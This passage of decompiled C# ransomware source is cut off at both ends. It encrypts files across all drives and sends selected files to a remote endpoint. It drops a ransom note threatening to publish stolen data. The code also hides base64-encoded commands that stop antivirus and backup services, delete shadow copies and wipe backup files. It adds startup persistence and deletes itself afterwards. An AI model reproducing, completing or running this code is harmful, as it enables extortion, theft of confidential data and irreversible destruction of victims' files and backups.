			process.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void RunPS(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static string ReverseString(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void MapDrv()
	{
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string base64EncodedData = ReverseString("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(Base64Decode("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(Base64Decode("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (HorseMount == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
				File.WriteAllText(text, Base64Decode("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				ProcessCommand("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_NetworkConnection").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.get_Current();
				if (!DizonList.Contains(((object)val.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					DizonList.Add(((object)val.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static bool Internet()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void CleanMyStuff()
	{
		ProcessCommand("cmd.exe", Base64Decode("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = Base64Decode("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		Process.Start(new ProcessStartInfo
		{
			Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(0);
	}

	public static string LeaveRegards(string mykey)
	{
		string text = Path.GetTempPath() + "\\READ_TO_RESTORE_YOUR_FILES.txt";
		if (!File.Exists(text))
		{
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(Base64Decode("PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkFsbCBZb3VyIEZpbGVzIEhhdmUgQmVlbiBFbmNyeXB0ZWQgISEKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkFsbCBvZiB5b3VyIGJhY2t1cHMgYW5kIHNoYWRvdyBjb3BpZXMgaGF2ZSBhbHNvIGJlZW4gZGVsZXRlZCBzbyBmb3JnZXQgcmVzdG9yaW5nIAp0aGVtLgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KV2UgYWxzbyBoYXZlIGJlZW4gYWJsZSB0byBzdGVhbCB5b3VyIGNvbmZpZGVudGlhbCBmaWxlcyAoZGF0YWJhc2VzLCBjdXN0b21lcnMgZGF0YSdzLApIUiBldGMuLi4pIGFsbCBvdmVyIHlvdXIgbmV0d29yayB3b3Jrc3RhdGlvbnMgYW5kIHNlcnZlcnMuCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KSWYgeW91IHdhbnQgdG8gaGVhciB5b3VyIG1pbmQgaW5zdGVhZCBvZiBvdXIgaW5zdHJ1Y3Rpb25zLCB5b3Ugd2lsbCBsb29zZSBzdHVwaWRseSB5b3VyCmZpbGVzIGJ1dCB5b3Ugd2lsbCBhbHNvIHNlZSB5b3VyIGZpbGVzIGJlaW5nIHB1Ymxpc2hlZCBvbmxpbmUgb3Igc2VsbCB0byB0aWVycyAoYW5kIHdlJ2xsIGRvIGl0KQoKSW4gdGhpcyBjYXNlLCBiZWxlaXZlIHVzIHRoYXQgeW91J3JlIGdvaW5nIHRvIHN1ZmZlciBhIGJpZyBmaW5hbmNpYWwgbG9zcyBhbmQgYSBiaWcgbG9zcwpvZiByZXB1dGF0aW9uLgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CldlIGFyZSBhd2FyZSB0aGF0IHlvdSBkb24ndCB3YW50IHRoaXMgY2FzZSB0b28gaGFwcGVucy4KCklmIHlvdSB3YW50IHRvIHJlc3RvcmUgZmlsZXMgYW5kIHdhbnQgdXMgdG8gZGVsZXRlIHlvdXIgY29uZmlkZW50aWFscyBmaWxlcywgY29udGFjdCB1cyByaWdodAp3aXRoIGEgbWVzc2FnZSB0byB0aGUgY29udGFjdCBhZGRyZXNzIGJlbG93LiBJbmNsdWRlIHRoZSBLZXlJRCBpbiB5b3VyIG1lc3NhZ2UgcGxzLgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkFyYWlIZWxwQHNlY21haWwucHJvCgpJZiB0aGVyZSdzIG5vIGFuc3dlcnMgZnJvbSB1cyBpbiB0aGUgbmV4dCAxNSBob3VycywgY29udGFjdCB1cyB0byA6CgpBcmFpSGVscDJAc2VjbWFpbC5wcm8KCk5vdGUgdGhhdCB5b3UgaGF2ZSBvbmx5IDQ4IGhvdXJzIHRvIGNvbnRhY3QgdXMuIEFmdGVyIHRoaXMgZGVsYXksIHRoZXJlIHdpbGwgYmUgbm8gZGF0YQpyZWNvdmVyZWQgYW5kIHlvdXIgZmlsZXMgd2lsbCBiZSBwdWJsaXNoZWQu"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(Base64Decode("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(mykey);
				return text;
			}
		}
		File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + mykey);
		return text;
	}

	public static void appShortcutToSartUp(string linkName, string appName)
	{
		using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + linkName + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + appName);
		streamWriter.WriteLine("IconIndex=0");
		string text = appName.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void Crypt(string[] dizin, string[] uzantilar, string[] excomunicated, string sifre, string crypt_uzantisi)
	{
		PasswordBytes = Encoding.ASCII.GetBytes(sifre);
		if (dizin[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length != 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !DizonList.Contains(drives[i].Name))
					{
						DizonList.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < dizin.Length; j++)
			{
				if (!DizonList.Contains(dizin[j]))
				{
					DizonList.Add(dizin[j]);
				}
			}
		}
		if (DizonList.Contains(Base64Decode("Qzpc")) && SkipC == "YES")
		{
			DizonList.Remove(Base64Decode("Qzpc"));
		}
		foreach (string t in DizonList)
		{
			if (MultipleThreads == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
			}
		}
	}

	public static void WorkerCrypter(string targetDir, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string> { "" };
		if (AlternateAlgo == "NO")
		{
			list = TraverseTree(targetDir, extensions, extension, excluded, DynamicPass);
			return;
		}
		list = RecursiveFileSearch.SearchFiles(targetDir);
		foreach (string text in extensions)
		{
			foreach (string item in list)
			{
				if (excluded.Length != 0)
				{
					int num = 0;
					while (num < excluded.Length)
					{
						string value = excluded[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02fa;
					}
				}
				if ((ProcessAll == "NO" && !item.EndsWith(text)) || EncryptedFiles.Contains(item))
				{
					continue;
				}
				if (ReleaseLockedFiles == "YES")
				{
					try
					{
						if (LockedFiles.Islocked(item))
						{
							LockedFiles.Killproc(item);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(item);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(item)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (PartialEncrytion == "YES" && fileStream.Length > Convert.ToInt32(PartialSize) * 1024 * 1024 && !list2.Contains(text))
					{
						if (Styler == "YES")
						{
							foreach (string item2 in extstyl)
							{
								if (item.ToLower().EndsWith(item2) && LimitMe == "YES")
								{
									if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											UtilMe.SendB("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LimitMe == "NO")
								{
									try
									{
										UtilMe.SendB("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] encrypted = Encryptions.AESEncryptBytes(Encryptions.ReadFromFile(item, Convert.ToInt32(PartialSize) * 1024 * 1024), Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						Encryptions.WriteToFile(item, encrypted);
						if (extension != ".*")
						{
							File.Move(item, item + extension);
						}
					}
					else if (extension != ".*")
					{
						Encrypt(item, item + extension, PasswordBytes);
					}
					else
					{
						Encrypt(item, item + ".part", PasswordBytes);
					}
				}
				catch (Exception)
				{
				}
				IL_02fa:;
			}
		}
	}

	public static void WorkerCrypter2(List<string> files, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		List<string> domeall = new List<string> { "" };
		Parallel.ForEach(extensions, delegate(string t1)
		{
			foreach (string file in files)
			{
				if (excluded.Length != 0)
				{
					string[] array = excluded;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!file.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02df;
					}
				}
				if ((!(ProcessAll == "NO") || file.EndsWith(t1)) && !EncryptedFiles.Contains(file))
				{
					if (ReleaseLockedFiles == "YES")
					{
						try
						{
							if (LockedFiles.Islocked(file))
							{
								LockedFiles.Killproc(file);
							}
						}
						catch
						{
						}
					}
					EncryptedFiles.Add(file);
					if (!EncryptedDirs.Contains(Path.GetDirectoryName(file)))
					{
						EncryptedDirs.Add(Path.GetDirectoryName(file));
					}
					try
					{
						FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (PartialEncrytion == "YES" && fileStream.Length > Convert.ToInt32(PartialSize) * 1024 * 1024 && !domeall.Contains(t1))
						{
							if (Styler == "YES")
							{
								foreach (string item in extstyl)
								{
									if (file.ToLower().EndsWith(item) && LimitMe == "YES")
									{
										if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
										{
											try
											{
												UtilMe.SendB("URL", "USERNAME", "ACCESO", file);
											}
											catch
											{
											}
										}
									}
									else if (file.ToLower().EndsWith(item) && LimitMe == "NO")
									{
										try
										{
											UtilMe.SendB("URL", "USERNAME", "ACCESO", file);
										}
										catch
										{
										}
									}
								}
							}
							fileStream.Dispose();
							if (Blocks == "NO")
							{
								byte[] encrypted = Encryptions.AESEncryptBytes(Encryptions.ReadFromFile(file, Convert.ToInt32(PartialSize) * 1024 * 1024), Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
								Encryptions.WriteToFile(file, encrypted);
							}
							else
							{
								Complex.Blocks.BlockProcess(file, PartialSize, DynamicPass);
							}
							if (extension != ".*")
							{
								File.Move(file, file + extension);
							}
						}
						else if (extension != ".*")
						{
							Encrypt2(file, file + extension, PasswordBytes);
						}
						else
						{
							Encrypt2(file, file + ".part", PasswordBytes);
						}
					}
					catch (Exception)
					{
					}
				}
				IL_02df:;
			}
		});
	}

	private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (outputFile.Length > 0)
				{
					FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (Styler == "YES")
					{
						foreach (string item in extstyl)
						{
							if (inputFile.ToLower().EndsWith(item) && LimitMe == "YES")
							{
								if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
									}
									catch
									{
									}
								}
							}
							else if (inputFile.ToLower().EndsWith(item) && LimitMe == "NO")
							{
								try
								{
									UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(inputFile) && num2 >= 0)
							{
								File.Delete(inputFile);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (outputFile.EndsWith(".part"))
					{
						File.Move(outputFile, outputFile.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(outputFile);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void Encrypt2(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (outputFile.Length > 0)
				{
					FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (Styler == "YES")
					{
						foreach (string item in extstyl)
						{
							if (inputFile.ToLower().EndsWith(item) && LimitMe == "YES")
							{
								if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
									}
									catch
									{
									}
								}
							}
							else if (inputFile.ToLower().EndsWith(item) && LimitMe == "NO")
							{
								try
								{
									UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(inputFile);
								break;
							}
							catch
							{
							}
						}
					}).Start();
					if (outputFile.EndsWith(".part"))
					{
						File.Move(outputFile, outputFile.Replace(".part", ""));
					}
					return;
				}
				new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(outputFile))
							{
								File.Delete(outputFile);
							}
							break;
						}
						catch
						{
						}
					}
				}).Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	static Program()
	{
		imha = "EVET";
		PasswordBytes = null;
		Size = "NO";
		Mb = "100000000";
		DizonList = new List<string>();
		DoneExtensions = new List<string>();
		Persistence = "NO";
		DynamicPass = "";
		DeceiveMe = "NO";
		rand = 0;
		ReleaseLockedFiles = "YES";
		AntiVM = "NO";
		Delay = "YES";
		DelayTime = "15";
		DisableDefender = "NO";
		DisableAMSI = "NO";
		CriticalProcess = "NO";
		WallpaperChanger = "NO";
		meltList = new List<string>
		{
			Base64Decode("bHNhc3MuZXhl"),
			Base64Decode("c3ZjaHN0LmV4ZQ=="),
			Base64Decode("Y3Jjc3MuZXhl"),
			Base64Decode("Y2hyb21lMzIuZXhl"),
			Base64Decode("ZmlyZWZveC5leGU="),
			Base64Decode("Y2FsYy5leGU="),
			Base64Decode("bXlzcWxkLmV4ZQ=="),
			Base64Decode("ZGxsaHN0LmV4ZQ=="),
			Base64Decode("b3BlcmEzMi5leGU="),
			Base64Decode("bWVtb3AuZXhl"),
			Base64Decode("c3Bvb2xjdi5leGU="),
			Base64Decode("Y3RmbW9tLmV4ZQ=="),
			Base64Decode("U2t5cGVBcHAuZXhl")
		};
		EncryptedDirs = new List<string>();
		SpreadOverNetwork = "YES";
		Live4Ever = "NO";
		KillTM = "NO";
		EncryptedFiles = new List<string>();
		FtpLog = "NO";
		appGuid = "3747bdbf-0ef0-42d8-9234-70d68801f407";
		MultipleThreads = "YES";
		WoL = "NO";
		netShadowList = new List<string>
		{
			Base64Decode("c3RvcCBhdnBzdXMgL3k="),
			Base64Decode("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
			Base64Decode("c3RvcCBtZmV3YyAveQ=="),
			Base64Decode("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
			Base64Decode("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
			Base64Decode("c3RvcCBEZWZXYXRjaCAveQ=="),
			Base64Decode("c3RvcCBjY0V2dE1nciAveQ=="),
			Base64Decode("c3RvcCBjY1NldE1nciAveQ=="),
			Base64Decode("c3RvcCBTYXZSb2FtIC95"),
			Base64Decode("c3RvcCBSVFZzY2FuIC95"),
			Base64Decode("c3RvcCBRQkZDU2VydmljZSAveQ=="),
			Base64Decode("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
			Base64Decode("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
			Base64Decode("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
			Base64Decode("c3RvcCBZb29CYWNrdXAgL3k="),
			Base64Decode("c3RvcCBZb29JVCAveQ=="),
			Base64Decode("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
			Base64Decode("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
			Base64Decode("c3RvcCBWU05BUFZTUyAveQ=="),
			Base64Decode("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
			Base64Decode("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
			Base64Decode("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
			Base64Decode("c3RvcCB2ZWVhbSAveQ=="),
			Base64Decode("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
			Base64Decode("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
			Base64Decode("c3RvcCBBY3JTY2gyU3ZjIC95"),
			Base64Decode("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
			Base64Decode("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
			Base64Decode("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
			Base64Decode("c3RvcCBzb3Bob3MgL3k=")
		};
		scList = new List<string>
		{
			Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
			Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
			Base64Decode("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
			Base64Decode("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
		};
		taskList = new List<string>
		{
			Base64Decode("L0lNIG1zcHViLmV4ZSAvRg=="),
			Base64Decode("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
			Base64Decode("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
		};
		vssList = new List<string>
		{
			Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
			Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
			Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
		};
		delList = new List<string>
		{
			Base64Decode("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
			Base64Decode("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
			Base64Decode("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
			Base64Decode("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
			Base64Decode("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
			Base64Decode("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
		};
		DelayedActivation = "NO";
		ExpireOption = "NO";
		ActiveAfterDateTime = new DateTime(2000, 1, 1);
		ExpireAfterDateTime = new DateTime(2100, 1, 1);
		PartialEncrytion = "YES";
